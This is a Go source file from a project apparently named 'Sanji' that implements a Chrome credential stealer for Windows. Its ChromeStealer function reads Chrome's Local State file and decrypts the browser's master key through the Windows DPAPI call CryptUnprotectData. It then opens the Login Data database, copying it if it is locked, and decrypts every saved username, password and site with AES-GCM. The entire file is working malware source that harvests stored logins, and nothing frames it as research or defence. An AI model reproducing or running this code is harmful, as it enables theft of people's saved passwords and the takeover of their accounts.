package core

import (
	"Sanji/utils"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
	_ "modernc.org/sqlite"
)

var (
	dllCrypt32        = windows.NewLazySystemDLL("Crypt32.dll")
	procUnprotectData = dllCrypt32.NewProc("CryptUnprotectData")
)

type ChromePasswords struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Website  string `json:"website"`
}

type ChromeOSCrypt struct {
	OSCrypt EncryptedKey `json:"os_crypt"`
}

type EncryptedKey struct {
	EncryptedKey string `json:"encrypted_key"`
}

type DataBlob struct {
	cbData uint32
	pbData *byte
}

func newBlob(dest []byte) *DataBlob {
	if len(dest) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &dest[0],
		cbData: uint32(len(dest)),
	}
}

func (blob *DataBlob) toByteArray() []byte {
	dest := make([]byte, blob.cbData)
	copy(dest, (*[1 << 30]byte)(unsafe.Pointer(blob.pbData))[:])
	return dest
}

func (blob *DataBlob) zeroMemory() {
	zero := make([]byte, blob.cbData)
	copy((*[1 << 30]byte)(unsafe.Pointer(blob.pbData))[:], zero)
}

func (blob *DataBlob) free() error {
	_, err := windows.LocalFree(windows.Handle(unsafe.Pointer(blob.pbData)))
	if err != nil {
		return nil
	}

	return nil
}

func decryptBytes(data []byte) ([]byte, error) {
	var (
		outBlob DataBlob
		r1      uintptr
		err     error
	)
	r1, _, err = procUnprotectData.Call(uintptr(unsafe.Pointer(newBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if r1 == 0 {
		return nil, err
	}

	dec := outBlob.toByteArray()
	outBlob.zeroMemory()
	return dec, outBlob.free()
}

func chromeDecrypt(EncryptedPwd []byte, Key []byte) []byte {
	block, _ := aes.NewCipher(Key)
	blockMode, _ := cipher.NewGCM(block)
	origData, _ := blockMode.Open(nil, EncryptedPwd[3:15], EncryptedPwd[15:], nil)
	return origData
}

func chromePasswordFile(UserFolder string, MasterKey []byte) []ChromePasswords {
	var PasswordJSON []ChromePasswords
	passwordFile := UserFolder + "Default\\Login Data"
	passwordDB, _ := sql.Open("sqlite", passwordFile)
	results, err := passwordDB.Query("SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins")
	if err != nil {
		copiedPath := utils.CopyPasswordFile(passwordFile, UserFolder)
		passwordDB, _ = sql.Open("sqlite", copiedPath)
		results, _ = passwordDB.Query("SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins")
	}
	defer passwordDB.Close()
	var url, username string
	var password []byte
	var blacklisted int
	for results.Next() {
		results.Scan(&url, &username, &password, &blacklisted)
		if len(password) > 15 {
			if blacklisted != 1 {
				decryptedPassword := chromeDecrypt(password, MasterKey)
				PasswordJSON = append(PasswordJSON, ChromePasswords{
					Username: username,
					Password: string(decryptedPassword),
					Website:  url,
				})
			}
		}
	}
	return PasswordJSON
}

func ChromeStealer(userFolder string) []ChromePasswords {
	chromeKeyFile := userFolder + "Local State"
	chromeFile, _ := os.Open(chromeKeyFile)
	stateBytes, _ := ioutil.ReadAll(chromeFile)

	var crypt ChromeOSCrypt
	json.Unmarshal(stateBytes, &crypt)

	decodedString, _ := base64.StdEncoding.DecodeString(crypt.OSCrypt.EncryptedKey)
	key, err := decryptBytes(decodedString[5:])
	if err != nil {
		return nil
	}

	PasswordJSON := chromePasswordFile(userFolder, key)
	return PasswordJSON
}
